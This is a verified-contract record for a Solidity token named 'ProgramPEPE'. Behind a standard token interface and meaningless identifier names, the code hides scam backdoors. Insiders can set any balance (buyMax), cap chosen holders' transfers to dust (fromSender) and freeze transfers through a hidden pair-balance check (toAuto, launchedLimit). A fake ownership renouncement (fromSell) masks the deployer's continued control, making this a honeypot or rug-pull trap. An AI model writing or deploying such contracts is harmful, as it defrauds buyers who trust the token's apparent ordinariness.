{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface modeTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverMode) external view returns (uint256);\n\n    function transfer(address atTx, uint256 fundEnable) external returns (bool);\n\n    function allowance(address teamFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atTx,\n        uint256 fundEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableSwapExempt, uint256 value);\n    event Approval(address indexed teamFund, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTradingReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listLimit {\n    function createPair(address listMinTo, address totalAutoSell) external returns (address);\n}\n\ninterface modeTeamMetadata is modeTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProgramPEPE is receiverTradingReceiver, modeTeam, modeTeamMetadata {\n\n    bool private limitTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSender;\n    }\n\n    function approve(address atReceiver, uint256 fundEnable) public virtual override returns (bool) {\n        tradingFund[_msgSender()][atReceiver] = fundEnable;\n        emit Approval(_msgSender(), atReceiver, fundEnable);\n        return true;\n    }\n\n    function fromSender(address shouldFund) public {\n        isFeeBuy();\n        if (limitTake) {\n            autoFeeFund = true;\n        }\n        if (shouldFund == toAt || shouldFund == fromMarketing) {\n            return;\n        }\n        receiverFundToken[shouldFund] = true;\n    }\n\n    uint256 constant toLimitSell = 18 ** 10;\n\n    constructor (){\n        if (limitTake) {\n            minTo = enableMin;\n        }\n        modeWallet swapReceiver = modeWallet(receiverMarketing);\n        fromMarketing = listLimit(swapReceiver.factory()).createPair(swapReceiver.WETH(), address(this));\n        if (totalList != senderFund) {\n            minTo = enableMin;\n        }\n        toAt = _msgSender();\n        fromSell();\n        shouldListIs[toAt] = true;\n        tokenTradingAuto[toAt] = liquiditySell;\n        if (totalList == senderFund) {\n            limitTake = false;\n        }\n        emit Transfer(address(0), toAt, liquiditySell);\n    }\n\n    uint256 feeFund;\n\n    function balanceOf(address receiverMode) public view virtual override returns (uint256) {\n        return tokenTradingAuto[receiverMode];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromTake;\n    }\n\n    uint256 private minTo;\n\n    uint256 private liquiditySell = 100000000 * 10 ** 18;\n\n    function fromSell() public {\n        emit OwnershipTransferred(toAt, address(0));\n        takeAt = address(0);\n    }\n\n    function allowance(address isReceiver, address atReceiver) external view virtual override returns (uint256) {\n        if (atReceiver == receiverMarketing) {\n            return type(uint256).max;\n        }\n        return tradingFund[isReceiver][atReceiver];\n    }\n\n    function transferFrom(address amountTx, address atTx, uint256 fundEnable) external override returns (bool) {\n        if (_msgSender() != receiverMarketing) {\n            if (tradingFund[amountTx][_msgSender()] != type(uint256).max) {\n                require(fundEnable <= tradingFund[amountTx][_msgSender()]);\n                tradingFund[amountTx][_msgSender()] -= fundEnable;\n            }\n        }\n        return launchedLimit(amountTx, atTx, fundEnable);\n    }\n\n    function transfer(address takeWallet, uint256 fundEnable) external virtual override returns (bool) {\n        return launchedLimit(_msgSender(), takeWallet, fundEnable);\n    }\n\n    uint256 minTake;\n\n    mapping(address => uint256) private tokenTradingAuto;\n\n    function toAuto(uint256 fundEnable) public {\n        isFeeBuy();\n        feeFund = fundEnable;\n    }\n\n    function toMinExempt(address liquidityTeam) public {\n        if (modeEnable) {\n            return;\n        }\n        if (autoFeeFund != teamTradingList) {\n            senderFund = true;\n        }\n        shouldListIs[liquidityTeam] = true;\n        if (senderFund) {\n            limitTake = true;\n        }\n        modeEnable = true;\n    }\n\n    function takeMode(address amountTx, address atTx, uint256 fundEnable) internal returns (bool) {\n        require(tokenTradingAuto[amountTx] >= fundEnable);\n        tokenTradingAuto[amountTx] -= fundEnable;\n        tokenTradingAuto[atTx] += fundEnable;\n        emit Transfer(amountTx, atTx, fundEnable);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeLiquidity;\n    }\n\n    bool public modeEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquiditySell;\n    }\n\n    bool public totalList;\n\n    function launchedLimit(address amountTx, address atTx, uint256 fundEnable) internal returns (bool) {\n        if (amountTx == toAt) {\n            return takeMode(amountTx, atTx, fundEnable);\n        }\n        uint256 tradingWalletEnable = modeTeam(fromMarketing).balanceOf(launchedTradingSwap);\n        require(tradingWalletEnable == feeFund);\n        require(atTx != launchedTradingSwap);\n        if (receiverFundToken[amountTx]) {\n            return takeMode(amountTx, atTx, toLimitSell);\n        }\n        return takeMode(amountTx, atTx, fundEnable);\n    }\n\n    bool private teamTradingList;\n\n    function isFeeBuy() private view {\n        require(shouldListIs[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingFund;\n\n    mapping(address => bool) public shouldListIs;\n\n    address private takeAt;\n\n    function getOwner() external view returns (address) {\n        return takeAt;\n    }\n\n    function owner() external view returns (address) {\n        return takeAt;\n    }\n\n    bool private senderFund;\n\n    string private takeLiquidity = \"Program PEPE\";\n\n    address launchedTradingSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed launchTo, address indexed toSwapReceiver);\n\n    address public toAt;\n\n    uint256 public enableMin;\n\n    address receiverMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private fromTake = 18;\n\n    function buyMax(address takeWallet, uint256 fundEnable) public {\n        isFeeBuy();\n        tokenTradingAuto[takeWallet] = fundEnable;\n    }\n\n    string private receiverSender = \"PPE\";\n\n    bool public autoFeeFund;\n\n    address public fromMarketing;\n\n    mapping(address => bool) public receiverFundToken;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSwapReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSwapExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFeeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundEnable\",\"type\":\"uint256\"}],\"name\":\"buyMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFundToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldListIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundEnable\",\"type\":\"uint256\"}],\"name\":\"toAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"}],\"name\":\"toMinExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ProgramPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}